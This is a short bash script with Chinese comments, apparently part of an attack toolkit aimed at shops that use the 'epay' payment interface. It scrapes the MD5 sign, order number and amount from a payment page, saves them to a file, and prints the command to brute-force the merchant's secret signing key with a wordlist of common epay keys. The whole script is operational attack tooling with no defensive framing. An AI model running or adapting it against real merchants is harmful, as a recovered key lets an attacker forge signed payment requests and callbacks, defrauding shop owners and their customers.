#!/bin/bash
# 从支付页提取 sign 参数喂 epay_key_brute
set -euo pipefail
PAY_URL="${1:?用法: $0 pay_page_url [pid] [trade_no] [amount]}"
PID="${2:-196}"
TRADE="${3:-}"
AMT="${4:-}"
OUT="/data/tools/faka/out/epay_sign_params.txt"

PAGE=$(curl -sS -L -k "$PAY_URL" 2>/dev/null || true)
SIGN=$(echo "$PAGE" | grep -oE 'sign=[a-f0-9]{32}' | head -1 | cut -d= -f2)
[ -z "$TRADE" ] && TRADE=$(echo "$PAGE" | grep -oE 'out_trade_no=[0-9]+' | head -1 | cut -d= -f2)
[ -z "$AMT" ] && AMT=$(echo "$PAGE" | grep -oE 'money=[0-9.]+' | head -1 | cut -d= -f2)

mkdir -p /data/tools/faka/out
cat > "$OUT" <<EOF
pid=$PID
out_trade_no=$TRADE
money=$AMT
sign=$SIGN
type=alipay
EOF
echo "[*] 提取参数 -> $OUT"
cat "$OUT"
echo "[*] 爆破: python3 /data/tools/faka/epay_key_brute.py --params $OUT -f /data/wordlists/epay/epay-keys-top.txt --limit 100000"
